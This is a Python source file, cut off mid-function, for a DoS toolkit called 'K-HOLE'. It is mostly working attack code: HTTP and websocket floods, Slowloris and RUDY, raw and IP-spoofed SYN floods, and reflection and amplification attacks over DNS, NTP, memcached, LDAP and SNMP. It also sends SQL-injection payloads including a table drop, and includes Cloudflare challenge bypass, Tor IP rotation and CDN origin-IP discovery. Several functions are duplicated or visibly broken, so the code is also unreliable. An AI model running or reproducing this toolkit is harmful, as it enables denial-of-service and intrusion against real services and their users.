# =========================================================
#    _  _           _  _      ____      _         ____   
#   FJ / ;         FJ  L]    F __ ]    FJ        F ___J  
#  J |/ (| ______ J |__| L  J |--| L  J |       J |___:  
#  |     L|______||  __  |  | |  | |  | |       | _____| 
#  F L:\  L______JF L__J J  F L__J J  F L_____  F L____: 
# J__L \\__L     J__L  J__LJ\______/FJ________LJ________L
# |__L  \L_|     |__L  J__| J______F |________||________|
# =========================================================
# K-HOLE - KJI's DoS and Stress Testing Toolkit
# Coded by KetaGod | https://t.me/ketagod
# You are responsible for whatever you use this toolkit on. 
# Thank you for using K-HOLE.
# =========================================================
import argparse
import threading
import random
import string
import time
import socket
import asyncio
import aiohttp
import requests
import json
import ssl
import hashlib
from ipwhois import IPWhois
import ipaddress
import whois
from aiohttp_socks import ProxyConnector
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from datetime import datetime
import os
import stem.process
from stem.control import Controller
import cloudscraper
import struct
import dns.resolver
import websockets
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import smtplib
from email.message import EmailMessage
from aiocoap import Context, Message, POST

init(autoreset=True)
ua = UserAgent()

# -- L7 Methods -- #
def http_flood(): 
    print("[HTTP Flood] Starting...")
    target = input("Target URL: ")
    threads = int(input("Number of Threads: "))
    duration = int(input("Duration (in seconds): "))

    def flood():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                requests.get(target, headers={'User-Agent': ua.random})
                print(f"Sent HTTP request to {target}")
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def async_http_flood(): 
    print("[Async HTTP Flood] Starting...")
    target = input("Target URL: ")
    duration = int(input("Duration (in seconds): "))

    async def send(session):
        try:
            async with session.get(target) as resp:
                await resp.read()
        except:
            pass

    async def main():
        timeout = time.time() + duration
        connector = aiohttp.TCPConnector(limit=None)
        async with aiohttp.ClientSession(connector=connector, headers={'User-Agent': ua.random}) as session:
            while time.time() < timeout:
                await asyncio.gather(*[send(session) for _ in range(100)])

    asyncio.run(main())

def websocket_flood():
    print("[Websocket Flood] Starting...")
    target = input("WebSocket URL (e.g. ws://example.com/socket): ")
    duration = int(input("Duration (in seconds): "))
    connections = int(input("Number of concurrent connections: "))

    async def flood_ws():
        try:
            async with websockets.connect(target) as ws:
                await ws.send("FLOOD")
                await asyncio.sleep(1)
        except:
            pass

    async def runner():
        timeout = time.time() + duration
        while time.time() < timeout:
            await asyncio.gather(*[flood_ws() for _ in range(connections)])

    asyncio.run(runner())

def browser_emulation_flood():
    print("[Broswer Emulation] Starting...")
    target = input("Target URL: ")
    threads = int(input("Number of Threads: "))
    duration = int(input("Duration (in seconds): "))

    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")

    def flood():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                driver = webdriver.Chrome(options=chrome_options)
                driver.get(target)
                print(f"[Browser Emulation] Loaded {target}")
                time.sleep(random.uniform(1, 3))
                driver.quit()
            except Exception as e:
                print(f"Error: {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()


def slowloris_attack():
    print("[Slowloris] Starting...")
    target = input("Target IP/Domain: ")
    port = int(input("Port (usually 80): "))
    sockets_count = int(input("Number of sockets to use: "))

    def init_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        try:
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {target}\r\n".encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        except socket.error:
            return None
        return s
    
    sockets = []
    print("Creating sockets...")
    for _ in range(sockets_count):
        s = init_socket()
        if s:
            sockets.append(s)

    print(f"Initiated {len(sockets)} sockets. Sending keep-alive headers...")
    end_time = time.time() + 60
    while time.time() < end_time:
        for s in list(sockets):
            try: 
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                sockets.remove(s)
                new_socket = init_socket()
                if new_socket:
                    sockets.append(new_socket)
        time.sleep(15)


def js_challenge_bypass():
    print("[JS Challenge Bypass] Starting...")
    target = input("Target URL: ")
    scraper = cloudscraper.create_scraper()
    try:
        response = scraper.get(target)
        print(f"[Bypass] Status Code: {response.status_code}")
        print(f"[Bypass] Response Lenghth: {len(response.text)}")
    except Exception as e:
        print(f"[Bypass] Error: {e}")

def custom_header_flood():
    print("[Custom Header Flood] Starting...")
    target = input("Target URL: ")
    threads = int(input("Number of Threads: "))
    duration = int(input("Duration (in seconds): "))

    def flood():
        end_time = time.time() + duration
        while time.time() < end_time:
            headers = {
                "User-Agent": ua.random,
                "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
                "Referer": f"https://{target}/",
                "Cache-Control": "no-cache"
            }
            try:
                requests.get(target, headers=headers)
                print(f"[Custom Header] Sent to {target}")
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def ssl_renegotiation_flood():
    print("[SSL Renegotiation] Starting...")
    target = input("Target domain/IP: ")
    port = int(input("Port (usually 443): "))
    threads = int(input("Number of Threads: "))
    duration = int(input("Duration (in seconds): "))

    import ssl

    def flood():
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                sock = socket.create_connection((target, port))
                ssl_sock = context.wrap_socket(sock, server_hostname=target)
                ssl_sock.do_handshake()
                for _ in range(5):
                    try:
                        ssl_sock.renegotiate()
                        ssl_sock.do_handshake()
                        print(f"[Renegotiation] Sent to {target}:{port}")
                    except:
                        break
                    ssl_sock.close()
            except:
                continue

    for _ in range(threads):
        threading.Thread(target=flood).start()

def rudy_attack():
    print("[RUDY] Starting...")
    target = input("Target URL (e.g. http://example.com): ")
    sockets = int(input("Number of Threads: "))
    duration = int(input("Duration (in seconds): "))

    end = time.time() + duration
    socket_list = []
    request = f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua.random}\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"

    def init_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        try:
            s.connect((target, 80))
            s.sendall(request.encode())
            return s
        except:
            return None
        
    for _ in range(sockets):
        s = init_socket()
        if s:
            socket_list.append(s)

    while time.time() < end:
        print(f"[RUDY] Sending keep-alive payloads... Active sockets: {len(socket_list)}")
        for s in list(socket_list):
            try:
                s.send(b"a")
            except:
                socket_list.remove(s)
        time.sleep(10)

    for s in socket_list:
        try:
            s.close()
        except:
            pass

# -- L4 Methods -- #
def udp_flood():
    print("[UDP Flood] Starting...")
    target = input("Target IP: ")
    port = int(input("Target Port: "))
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration

    def flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while time.time() < timeout:
                try:
                    bytes_to_send = random._urandom(1024)
                    s.sendto(bytes_to_send, (target, port))
                    print(f"[UDP] Sent packet to {target}:{port}")
                except Exception as e:
                    print(f"[UDP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def tcp_flood():
    print("[TCP Flood] Starting...")
    target = input("Target IP: ")
    port = int(input("Target Port: "))
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((target, port))
                    s.send(random._urandom(1024))
                    print(f"[TCP] Sent packet to {target}:{port}")
            except Exception as e:
                print(f"[TCP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def ack_rst_flood():
    print("[ACK/RST Flood] Starting...")
    target = input("Target IP: ")
    port = int(input("Target Port: "))
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration

    def flood():
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
            while time.time() < timeout:
                try:
                    packet = random._urandom(1024)
                    s.sendto(packet, (target, port))
                    print(f"[ACK/RST] Sent to {target}:{port}")
                except Exception as e:
                    print(f"[ACK/RST Error] {e}")
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def syn_cookie_bypass():
    print("[SYN Cookie Bypass] Starting...")
    target = input("Target IP: ")
    port = int(input("Target Port: "))
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration

    def flood():
        while time.time() < duration:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.connect((target, port))
                    s.send(b'\x00')
                    print(f"[SYN Cookie Bypass] Sent packet to {target}:{port}")
            except Exception as e:
                print(f"[SYN Cookie Bypass Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def ping_of_death():
    print("[Ping of Death] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                packet = b"\xFF" * 65500 
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
                    s.sendto(packet, (target, 1))
                    print(f"[PoD] Sent to {target}")
            except Exception as e:
                print(f"[PoD Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def smurf_attack():
    print("[Smurf Attack] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    packet = b"\x08\x00" + b"\x00" *46
                    s.sendto(packet, (target, 1))
                    print(f"[Smurf] Sent ICMP to broadcast for {target}")
            except Exception as e:
                print(f"[Smurf Error] {e}")
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def xmas_flood():
    print("[XMAS Flood] Starting...")
    target = input("Target IP: ")
    port = int(input("Port: "))
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration
    flags = 0x29 # FIN + PSH + URG

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    packet = struct.pack('!BBHHHBBH4s4s',
                                         69, 0, 40, 54321, 0, 64, socket.inet_aton(target))
                    packet += struct.pack('!HHLLBBHHH',
                                          random.randint(1024, 65535), port, 0, 0,
                                          5 << 4, flags, 8192, 0, 0)
                    s.sendto(packet, (target, 0))
                    print(f"[XMAS] Sent packet to {target}:{port}")
            except Exception as e:
                print(f"[XMAS Error] {e}")
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def ip_spoofed_syn_flood():
    print("[IP Spoofed SYN Flood] Starting...")
    target = input("Target IP: ")
    port = int(input("Target Port: "))
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))

    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,
                                            socket.inet_aton(src_ip), socket.inet_aton(target))
                    tcp_header = struct.pack('!HHLLBBHHH',
                                             random.randint(1024, 65535), port, 0, 0,
                                             5 << 4, 2, 8192, 0, 0) # SYN flag = 2
                    packet = ip_header + tcp_header
                    s.sendto(packet, (target, 0))
                    print(f"[IP Spoofed SYN] Sent spoofed SYN to {target}:{port} from {src_ip}")
            except Exception as e:
                print(f"[IP Spoofed SYN Error] {e}")
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def reflected_icmp_flood():
    print("[Reflected ICMP Flood] Starting...")
    target = input("Target IP: ")
    reflectors = input("Reflector IPs (comma-separated): ").split(',')
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                reflector = random.choice(reflectors).strip()
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    packet = b"\x08\x00" + b"\x00" * 46 # ICMP Echo Request
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                                            69, 0, 84, 54321, 0, 64, socket.IPPROTO_ICMP, 0,
                                            socket.inet_aton(target), socket.inet_aton(reflector))
                    full_packet = ip_header + packet
                    s.sendto(full_packet, (reflector, 0))
                    print(f"[Reflected ICMP] Sent forged ICMP from {target} to {reflector}")
            except Exception as e:
                print(f"[Reflected ICMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def gre_flood():
    print("[GRE Flood] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, 47) as s:
                    packet = b"GREPACKET" + os.urandom(100)
                    s.sendto(packet, (target, 0))
                    print(f"[GRE] Sent GRE packet to {target}")
            except Exception as e:
                print(f"[GRE Error] {e}")
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def fragmentation_flood():
    print("[Fragmentation Flood] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    for _ in range(3):
                        data = os.urandom(1480)
                        s.sendto(data, (target, random.randint(1024, 65535)))
                    print(f"[FRAG] Sent fragmented UDP packets to {target}")
            except Exception as e:
                print(f"[FRAG Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def smtp_flood():
    print("[SMTP Flood] Starting...")
    smtp_server = input("SMTP Server (e.g. smtp.example.com): ")
    port = int(input("Port (e.g. 587 or 25): "))
    sender = input("Sender email: ")
    password = input("Sender password (for auth, leave blank if none): ")
    recipient = input("Target email address: ")
    subject = input("Subject line: ")
    body = input("Body content: ")
    count = int(input("Number of emails to send: "))

    def send_mail():
        try:
            server = smtplib.SMTP(smtp_server, port, timeout=10)
            server.starttls()
            if password:
                server.login(sender, password)
            for _ in range(count):
                msg = EmailMessage()
                msg.set_content(body)
                msg["Subject"] = subject
                msg["From"] = sender
                msg["To"] = recipient
                server.send_message(msg)
                print(f"[SMTP] Sent email to {recipient}")
            server.quit()
        except Exception as e:
            print(f"[SMTP Error] {e}")

    threading.Thread(target=send_mail).start()

def webdav_abuse():
    print("[WebDAV Abuse] Starting...")
    target_url = input("Target WebDAV URL (e.g. http://host/webdav/): ")
    filename = input("Filename to upload (e.g. example.txt): ")
    content = input("File contents to upload: ")

    try:
        response = requests.put(target_url + filename, data=content.encode(), headers={"Content-Type": "text/plain"})
        if response.status_code in [200, 201, 204]:
            print(f"[WebDAV] Successfully uploaded '{filename}' to {target_url}")
    except Exception as e:
        print(f"[WebDAV Error] {e}")

def sql_slam_attack():
    print("[SQL Slam] Starting...")
    target_url = input("Target Url (must have a query string): ")
    duration = int(input("Duration (in seconds): "))
    delay = float(input("Delay between requests (in seconds): "))
    timeout = time.time() + duration
    payloads = [
        "' OR '1'='1", "'; DROP TABLE users; --",
        "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"
    ]

    def attack():
        while time.time() < timeout:
            try:
                payload = random.choice(payloads)
                response = requests.get(f"{target_url}{payload}", headers={"User-Agent": ua.random})
                print(f"[SQL Slam] Sent payload: {payload} - Status: {response.status_code}")
                time.sleep(delay)
            except Exception as e:
                print(f"[SQL Slam Error] {e}")

    threading.Thread(target=attack).start()

def dns_cache_buster():
    print("[DNS Cache Buster] Starting...")
    base_url = input("Target base domain (e.g. https://example.com): ")
    duration = int(input("Duration in seconds: "))
    delay = float(input("Delay between requests (in seconds): "))
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                rand_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
                full_url = base_url.replace("https://" f"https://{rand_sub}.").replace("http://", f"http://{rand_sub}.")
                response = requests.get(full_url, headers={"User-Agent": ua.random})
                print(f"[DNS Buster] Requested {full_url} - Status: {response.status_code}")
                time.sleep(delay)
            except Exception as e:
                print(f"[DNS Buster Error] {e}")

    threading.Thread(target=flood).start()

def reverse_dns_asn_lookup():
    target = input("Enter IP to lookup: ")
    try:
        print("[+] Running reverse DNS...")
        hostname = socket.gethostbyaddr(target)[0]
        print(f"[DNS] Hostname: ")
    except:
        print("[DNS] Could not resolve hostname :/")

    try:
        print("[+] Running ASN lookup...")
        obj = IPWhois(target)
        results = obj.lookup_rdap()
        asn = results.get("asn", "N/A")
        org = results.get("network", {}).get("name", "N/A")
        country = results.get("network", {}).egt("country", "N/A")
        print(f"[ASN] ASN: {asn}, Org: {org}, Country: {country}")
    except Exception as e:
        print(f"[ASN Lookup Error] {e}")

def whois_lookup():
    target = input("Enter domain to run WHOIS lookup: ")
    try:
        data = whois.whois(target)
        print("[WHOIS Lookup Results]")
        for key, value in data.items():
            print(f"{key}: {value}")
    except Exception as e:
        print(f"[WHOIS Error] {e}")

# -- Amplification Attacks -- #
def dns_amplification():
    print("[DNS Amplification] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
    domain = "google.com"
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    spoof_ip = socket.inet_aton(target)
                    for dns_ip in dns_servers:
                        query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +b''.join(bytes([len(part)]) + part.encode() for part in domain.split('.')) + b'\x00\x00\x01\x00\x01'
                        s.sendto(query, (dns_ip, 53))
                        print(f"[DNS AMP] Sent spoofed DNS request to {dns_ip}")
            except Exception as e:
                print(f"[DNS AMP Error] {e}")
    
    for _ in range(threads):
        threading.Thread(target=flood).start()

def ssdp_amplification():
    print("[SSD Amplification] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    ssdp_servers = [
        "239.255.255.2250"
    ]
    msg = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "ST: ssdp:all\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX 3\r\n\r\n"
    ).encode()
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                for server in ssdp_servers:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(msg, (server, 1900))
                        print(f"[SSDP AMP] Sent SSDP request to {server}")
            except Exception as e:
                print(f"[SSDP AMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def ntp_amplification():
    print("[NTP Amplification] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    ntp_servers = ["pool.ntp.org", "time.google.com"]
    timeout = time.time() + duration
    payload = b'\x17\x00\x03\x2a' + b'\x00' * 4

    def flood():
        while time.time() < timeout:
            try:
                for server in ntp_servers:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(payload, (server, 123))
                        print(f"[NTP AMP] Sent NTP request to {server}")
            except Exception as e:
                print(f"[NTP AMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def memcached_amplification():
    print("[Memcached Amplification] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    mem_servers = ["192.168.1.100"] # Replace with a vulnerable memcached server or servers :p
    payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                for server in mem_servers:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(payload, (server, 11211))
                        print(f"[MEMCACHED AMP] Sent stats query to {server}")
            except Exception as e:
                print("[MEMCACHED AMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def ldap_amplification():
    print("[LDAP Amplification] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    ldap_servers = ["192.0.2.1"] # Replace with a vulnerable LDAP server or servers :p
    payload = b'\x30\x84\x00\x00\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00' # Feel free to change bind request
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                for server in ldap_servers:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(payload, (server, 389))
                        print(f"[LDAP AMP] Sent LDAP bind to {server}")
            except Exception as e:
                print(f"[LDAP AMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def cldap_reflection():
    print("[CLDAP Reflection] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    cldap_servers = ["192.0.2.2"] # Replace with a vulernable CLDAP server or servers :p
    payload = b'\x30\x1d\x02\x01\x01\x63\x18\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73'
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                for server in cldap_servers:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(payload, (server, 389))
                        print(f"[CLDAP AMP] Sent CLDAP request to {server}")
            except Exception as e:
                print(f"[CLDAP AMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def snmp_amplification():
    print("[SNMP Amplification] Starting...")
    target = input("Target IP: ")
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    snmp_servers = ["192.0.2.3"] # Replace with a vulnerable SNMP server or servers :p
    payload = b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x70\x6f\x63\x6b\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
    timeout = time.time() + duration

    def flood():
        while time.time() < timeout:
            try:
                for server in snmp_servers:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(payload, (server, 161))
                        print(f"[SNMP AMP] Sent SNMP request to {server}")
            except Exception as e:
                print(f"[SNMP AMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

def vse_amplification():
    print("[VSE Amplification] Starting...")
    target = input("Target IP: ")
    port = int(input("Port: "))
    duration = int(input("Duration (in seconds): "))
    threads = int(input("Threads: "))
    timeout = time.time() + duration
    payload = b'\xFF\xFF\xFF\xFFTSource Engine Query\x00'

    def flood():
        while time.time() < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(payload, (target, port))
                    print(f"[VSE AMP] Sent VSE request to {target}:{port}")
            except Exception as e:
                print(f"[VSE AMP Error] {e}")

    for _ in range(threads):
        threading.Thread(target=flood).start()

# -- Tools / Utility -- #
def tor_ip_renewal():
    print("[TOR IP Renewal] Rotating IP using TOR...")
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(stem.Signal.NEWNYM)
            time.sleep(3)
            print("[TOR] IP rotated successfully. Verify circuit if needed")
    except Exception as e:
        print(f"[TOR Error] {e}")

def port_scanner():
    print("[Port Scanner] Starting...")
    target = input("Target IP/Domain: ")
    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389]
    open_ports = []
    print("[Scanning Ports...]")

    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    print(f"[OPEN] Port {port} is open.")
                    open_ports.append(port)
        except Exception as e:
            print(f"[Scan Error] {e}")

    if not open_ports:
        print("[Scan Complete] No open ports found :/")
    else:
        print(f"[Scan Complete] Open ports: {open_ports}")

def custom_payload_editor():
    print("[Payload Editor] Make custom payload files here")
    payload_file = input("Enter filename to save payloads (e.g. payloads.txt): ")
    print("Enter payloads one by one. Type 'done' to finish")
  
    payloads = []
    while True:
        line = input("Payload: ")
        if line.strip().lower() == "done":
            break
        payloads.append(line.strip())

    try:
        with open(payload_file, "w") as f:
            f.write('\n'.join(payloads))
        print(f"[Payload Editor] Saved {len(payloads)} payloads to {payload_file}")
    except Exception as e:
        print(f"[Payload Editor Error] {e}")

def macro_script_engine():
    print("[Macro Engine] Load and execute custom script macros")
    script_file = input("Enter script filename (.txt or .macro): ")

    if not os.path.exists(script_file):
        print("[Macro Engine] File not found :/")
        return
    
    try:
        with open(script_file, 'r') as f:
            commands = [line.strip() for line in f if line.strip() and not line.startswith('#')]

            for cmd in commands:
                print(f"[Macro Engine] Executing: {cmd}")
                try:
                    exec(cmd, globals())
                except Exception as e:
                    print(f"[Macro Error] {e}")
    except Exception as err:
        print(f"[Macro Engine Error] {err}")

def interactive_header_builder():
    print("[Header Builder] Customizable HTTP headers for attacks")
    headers = {}
    while True:
        key = input("Header name (or 'done' to finish): ")
        if key.lower() == 'done':
            break
        value = input(f"Value for '{key}': ")
        headers[key] = value

    filename = input("Save headers to file (e.g. headers.json): ")
    try:
        with open(filename, 'w') as f:
            json.dump(headers, f, indent=2)
        print(f"[Header Builder] Saved {len(headers)} headers to {filename}")
    except Exception as e:
        print(f"[Header Builder Error] {e}")

# -- Recon Tools -- #

def reverse_dns_asn_lookup():
    target = input("Enter IP to lookup: ")
    try:
        print("[+] Running reverse DNS...")
        hostname = socket.gethostbyaddr(target)[0]
        print(f"[DNS] Hostname: ")
    except:
        print("[DNS] Could not resolve hostname :/")

    try:
        print("[+] Running ASN lookup...")
        obj = IPWhois(target)
        results = obj.lookup_rdap()
        asn = results.get("asn", "N/A")
        org = results.get("network", {}).get("name", "N/A")
        country = results.get("network", {}).egt("country", "N/A")
        print(f"[ASN] ASN: {asn}, Org: {org}, Country: {country}")
    except Exception as e:
        print(f"[ASN Lookup Error] {e}")

def whois_lookup():
    target = input("Enter domain to run WHOIS lookup: ")
    try:
        data = whois.whois(target)
        print("[WHOIS Lookup Results]")
        for key, value in data.items():
            print(f"{key}: {value}")
    except Exception as e:
        print(f"[WHOIS Error] {e}")

def ip_range_scanner():
    print("[IP Range Scanner] Scan for live  hosts in CIDR block")
    cidr = input("Enter CIDR (e.g. 192.168.1.0/24): ")
    port = int(input("Port to scan (e.g. 80): "))
    timeout = float(input("Timeout per host (sec, e.g. 0.5): "))
    max_threads = 50
    live_hosts = []

    def scan(ip):
        try:
            with socket.socket() as s:
                s.settimeout(timeout)
                s.connect((str(ip), port))
                print(f"[OPEN] {ip}L{port}")
                live_hosts.append(str(ip))
        except:
            pass

    try:
        network = ipaddress.ip_network(cidr, strict=False)
        threads = []
        for ip in network.hosts():
            t = threading.Thread(target=scan, args=(ip,))
            threads.append(t)
            t.start()
            if len(threads) >= max_threads:
                for thread in threads:
                    thread.join()
                threads = []
        for thread in threads:
            thread.join()

        print("\nScan complete. Live hosts:")
        for host in live_hosts:
            print(f" - {host}")

    except Exception as e:
        print(f"[Scanner Error] {e}")

def real_ip_resolver():
    domain = input("Enter domain behind CDN (e.g. cloudflare site): ")
    try:
        print("[+] Running DNS brute on  common subdomains...")
        subdomains = ["www", "ftp", "direct", "mail", "web", "origin"]
        for sub in subdomains:
            target = f"{sub}.{domain}"
            try:
                answers = dns.resolver.resolve(target, 'A')
                for rdata in answers:
                    ip = rdata.to_text()
                    print(f"[FOUND] {target} → {ip}")
            except:
                continue
    except Exception as e:
        print(f"[Resolver Error] {e}")

# -- Misc Tools -- #
def load_config_profile():
    print("[Config Loader] Load an attack config profile (.khcfg or .json)")
    filename = input("Enter config filename: ")

    if not os.path.exists(filename):
        print("[Error] File not found :/")
        return
    
    try:
        with open(filename, 'r') as f:
            config = json.load(f)
        print("[Loaded Config]")
        for key, value in config.items():
            print(f"{key}: {value}")
        
        ## Feel free to change this up to your liking
        ## (If you don't know what you're doing, then don't change anything)
        method = config.get("mode")
        target = config.get("target")
        duration = int(config.get("duration", 60))
        threads = int(config.get("threads", 50))
        port = int(config.get("port", 80))

        if method == "http":
            http_flood(target, "GET", duration, threads)
        elif method == "udp":
            udp_flood(target, port, duration, threads)
        elif method == "tcp":
            tcp_flood(target, port, duration, threads)
        else:
            print("[!] Unsupported or missing mode in config")
    except Exception as e:
        print(f"[Config Load Error] {e}")

def chain_attacks():
    print("[Chain Attacks] Starting...")
    sequence = []

    print("Enter methods to chain (e.g. http, udp, tcp). Type 'done' to finish:")
    while True:
